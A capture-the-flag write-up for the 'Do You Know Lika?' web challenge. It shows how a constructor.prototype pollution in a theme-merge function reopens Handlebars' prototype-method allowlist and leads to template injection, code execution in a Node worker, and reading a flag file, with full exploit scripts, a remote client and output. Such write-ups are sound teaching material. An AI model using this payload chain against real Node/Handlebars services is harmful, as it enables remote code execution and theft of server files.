---
title: "Do You Know Lika?"
category: "Web"
tags: ["handlebars", "prototype-pollution", "ssti", "node.js", "permission-model", "file-read"]
solve_date: "2026-10-10"
language: "en"
---

# Do You Know Lika?

**Flag:** `FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_abbe7f195b}`
**Service:** `https://do-you-know-lika-01bae347bde5.inst9.ctf.fortid.com`, endpoint `POST /api/preview`. **Artifact:** `handout.zip` (16 KB), containing `src/server.js` (6471 B), `src/worker.js` (2579 B), `src/templates/postcard-layout.hbs` (91 B), `package.json` and `flag.txt` (17 B).

## Challenge

> The Lika Tourist Board has launched a postcard designer for visitors who think they know the region. Pick a theme, fill in the postcard data, and let a fresh print worker process prepare a preview.
>
> Can you print the ranger's secret?

The player POSTs a JSON object to `/api/preview` with three fields: `template`, `theme`, `model`. `server.js` validates the request and then spawns a fresh Node process running `src/worker.js` for each print.

Two placeholders must be excluded up front: the handout's `flag.txt` (17 B) contains `FortID{redacted}`, the sample value the entrypoint replaces from `FLAG`; and `server.js:203` holds `const flag = process.env.FLAG || "FortID{development_flag}";` — `FortID{development_flag}` is the development default, not a flag.

## Analysis

**The render path.** `worker.js:52-77` compiles `job.template` with Handlebars and invokes it with:

```js
return template({ ...job.model, theme }, {
  data: rootData,
  partials: safePartials,
  allowProtoMethodsByDefault: false,
  allowProtoPropertiesByDefault: false,
});
```

The supplied template is compiled. The defaults deny prototype access unless a method is explicitly allowlisted; the payload below changes that allowlist.

`validateJob` (`server.js:49-79`) blocks the `__proto__` name recursively through `containsBlockedKey`, and rejects certain partial syntax: dynamic partial invocation (an opening delimiter followed by `> (`), inline layout declaration (an opening delimiter followed by `#*inline`), plus a partial-name allowlist. It does not restrict templates otherwise.

**The pollution step.** `worker.js:13-23` merges the theme with:

```js
function mergeTheme(target, source) {
  for (const [key, value] of Object.entries(source)) {
    if (value !== null && typeof value === "object") {
      target[key] ??= Array.isArray(value) ? [] : {};
      mergeTheme(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
}
```

With `theme = {"constructor":{"prototype":{"allowedProtoMethods":{...}}}}`:

- `target` starts as `{}`, so `target["constructor"]` already exists through the prototype chain (it returns `Object`); `??=` does not overwrite it and the recursive call descends straight into the **`Object` function**.
- Likewise `Object["prototype"]` already exists, so the second recursion lands on `Object.prototype`.
- The final assignment sets `Object.prototype.allowedProtoMethods` to `{constructor: true, apply: true, call: true}`.

The server only blocks the literal `__proto__` key; the `constructor` → `prototype` chain reaches the same object.

**Why that reopens the Handlebars gate.** Handlebars builds the per-method allowlist from the options object itself:

```js
methods: {
  whitelist: createNewLookupObject(defaultMethodWhiteList, runtimeOptions.allowedProtoMethods),
  defaultValue: runtimeOptions.allowProtoMethodsByDefault
}
```

`createProtoAccessControl(runtimeOptions)` (`lib/handlebars/internal/proto-access.js`) reads `runtimeOptions.allowedProtoMethods` — a key that `worker.js` **does not** set. After the pollution step, that read falls through to `Object.prototype.allowedProtoMethods` and returns the object the player just supplied. `createNewLookupObject` merges it into `defaultMethodWhiteList` (which sets `constructor: false`), so `constructor`, `apply` and `call` become valid methods with `whitelist[name] === true`.

`allowProtoMethodsByDefault: false` is still in place, but the per-method allowlist is now player-controlled.

**The primitive chain.** With the allowlist reopened, the template works in three steps (below, `OB`/`CB` stand for the two-character Handlebars opening and closing delimiters, written as tokens so this writeup contains no literal delimiters):

```text
OBsetLayoutOption @root.o key="title" value=(lookup (lookup "a" "constructor") "constructor")CB
OB#each @root.oCBsetLayoutOption @root.o2 key="title" value=(apply "" @root.c1)CBOB/eachCB
OB#each @root.o2CB{apply "" @root.c2}CBOB/eachCB
```

- `lookup "a" "constructor"` gives `String`; `lookup String "constructor"` gives `Function`. `setLayoutOption` (`worker.js:33-46`) writes that value into `@root.o.title` — the helper allows those keys on a target object, so this is the channel for stashing objects.
- `#each @root.o` iterates the own-property values of `o`, so the block context is `Function`. In that context `(apply "" @root.c1)` resolves to `Function.prototype.apply` invoked on `Function` with `thisArg = ""` and argsArray `[CODE]` — equivalent to `Function(CODE)`, i.e. compiling a new function from `model.c1[0]`. The result is stored in `@root.o2.title`.
- The second block, `#each @root.o2`, has the freshly compiled function as its context; the triple-layer stache for `apply "" @root.c2` with `c2 = []` is equivalent to `fn.apply("", [])`, i.e. **calling the function**. The triple-layer form prints the return value raw, without escaping.

The code runs inside the print worker process, spawned with:

```js
const WORKER_ARGUMENTS = [
  "--permission",
  "--allow-fs-read=/challenge",
  "--allow-fs-read=/tmp/lika/flag.txt",
  "--max-old-space-size=48",
  WORKER,
];
```

and its `env` carries `FLAG_PATH=/tmp/lika/flag.txt`. The worker may read `/challenge` and the specified flag file, so the payload only has to read it:

```js
return process.mainModule.require('fs').readFileSync(process.env.FLAG_PATH||'/tmp/lika/flag.txt','utf8')
```

`process.mainModule.require` is used instead of `require` because a function body built by `new Function` does not sit in module scope. `prepareFlag()` also does `delete process.env.FLAG` (`server.js:205`), so the flag survives only in the file — there is no environment-variable shortcut.

## Solution

Validate locally first. Both `server.js` and `worker.js` export their functions, so `validateJob` and `render` can be called directly without building a container:

```js
"use strict";
const path = require("path");
const { render } = require(path.join(__dirname, "..", "handout", "do_you_know_lika", "src", "worker.js"));
const { validateJob } = require(path.join(__dirname, "..", "handout", "do_you_know_lika", "src", "server.js"));
const CODE = process.argv[2] || "return 7*7";
const OB = "\u007b\u007b", CB = "\u007d\u007d";
const theme = { constructor: { prototype: { allowedProtoMethods: { constructor: true, apply: true, call: true } } } };
const template =
  OB + 'setLayoutOption @root.o key="title" value=(lookup (lookup "a" "constructor") "constructor")' + CB +
  OB + '#each @root.o' + CB + OB + 'setLayoutOption @root.o2 key="title" value=(apply "" @root.c1)' + CB + OB + '/each' + CB +
  OB + '#each @root.o2' + CB + OB + '{apply "" @root.c2}' + CB + OB + '/each' + CB;
const job = { template, theme, model: { o: {}, o2: {}, c1: [CODE], c2: [] } };
console.log("validateJob:", validateJob(job));
try { console.log("OUTPUT:", JSON.stringify(render(job))); } catch (e) { console.log("ERR:", e.message); }
```

```console
$ node stage.js "return 7*7"
```

```text
validateJob: null
OUTPUT: "49"
```

```console
$ FLAG_PATH=$PWD/fakeflag.txt node stage.js "return process.mainModule.require('fs').readFileSync(process.env.FLAG_PATH,'utf8')"
```

```text
validateJob: null
OUTPUT: "FortID{local_test_flag_not_real}\n"
```

`FortID{local_test_flag_not_real}` is the content of a `scratch/fakeflag.txt` created by hand to exercise the file-read path; it is a local placeholder, not a flag. The local run calls `render()` inside the current process, so no `--permission` sandbox applies and `FLAG_PATH` has to point at a local file.

The client that talks to the real instance uses exactly the template verified above:

```js
"use strict";
const URL_BASE = "https://do-you-know-lika-01bae347bde5.inst9.ctf.fortid.com";
const CODE = process.argv[2];
// OB/CB are the Handlebars delimiters, written as escapes so this file holds no literal markers.
const OB = "\u007b\u007b", CB = "\u007d\u007d";
const theme = { constructor: { prototype: { allowedProtoMethods: { constructor: true, apply: true, call: true } } } };
const template =
  OB + 'setLayoutOption @root.o key="title" value=(lookup (lookup "a" "constructor") "constructor")' + CB +
  OB + '#each @root.o' + CB + OB + 'setLayoutOption @root.o2 key="title" value=(apply "" @root.c1)' + CB + OB + '/each' + CB +
  OB + '#each @root.o2' + CB + OB + '{apply "" @root.c2}' + CB + OB + '/each' + CB;
const body = JSON.stringify({ template, theme, model: { o: {}, o2: {}, c1: [CODE], c2: [] } });
fetch(URL_BASE + "/api/preview", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body,
}).then(async r => console.log(r.status, (await r.text()).slice(0, 4000)))
  .catch(e => console.log("NETERR:", e.message));
```

The first probe only demonstrates code execution inside the worker:

```console
$ node remote.js "return 7*7"
```

```text
200 {"ok":true,"output":"49"}
```

Reading the flag:

```console
$ node remote.js "return process.mainModule.require('fs').readFileSync(process.env.FLAG_PATH||'/tmp/lika/flag.txt','utf8')"
```

```text
200 {"ok":true,"output":"FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_abbe7f195b}\n"}
```

The trailing `\n` comes from `prepareFlag()` writing `${flag}\n` (`server.js:204`); it is not part of the flag.

## Result

```text
FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_abbe7f195b}
```

The flag was read directly from the challenge service. No submission response recorded.

## Reproduce

Requires Node.js (tested on v24), `unzip`, and the handout dependencies (`express@4.21.2`, `handlebars@4.7.8`). The payload construction runs entirely locally; only the `7*7` request and the flag read need a live instance.

```console
$ mkdir -p lika-work/scratch
$ unzip handout.zip -d lika-work/handout
$ cd lika-work/handout/do_you_know_lika && npm ci --omit=dev && cd ../../..
```

`handout.zip` unpacks to a `do_you_know_lika/` directory, so `unzip -d lika-work/handout` produces exactly the layout `lika-work/handout/do_you_know_lika/src/...`. Save the first JS block as `lika-work/scratch/stage.js` and the second as `lika-work/scratch/remote.js`; the two `require` paths in `stage.js` already resolve to `../handout/do_you_know_lika/src/...`. Create the test file and run:

```console
$ printf 'FortID{local_test_flag_not_real}\n' > fakeflag.txt
$ node stage.js "return 7*7"
$ FLAG_PATH=$PWD/fakeflag.txt node stage.js "return process.mainModule.require('fs').readFileSync(process.env.FLAG_PATH,'utf8')"
$ node remote.js "return 7*7"
$ node remote.js "return process.mainModule.require('fs').readFileSync(process.env.FLAG_PATH||'/tmp/lika/flag.txt','utf8')"
```

Optionally, rebuild the local service with Docker following the handout README:

```console
$ docker build -t do-you-know-lika -f deploy/Dockerfile .
$ docker run --rm -p 8080:8080 --read-only --tmpfs /tmp:rw,noexec,nosuid,nodev,size=16m \
    --cap-drop ALL --security-opt no-new-privileges:true --memory 128m --cpus 0.5 --pids-limit 48 \
    -e 'FLAG=FortID{local_not_real}' do-you-know-lika
```

The two `OB`/`CB` lines in the scripts are the escape sequences `\u007b\u007b` and `\u007d\u007d`; the `template` string built at runtime is 237 characters long and matches the original template submitted to the instance byte for byte, so the payload is unchanged. If the instance hostname changes, only `URL_BASE` needs editing.
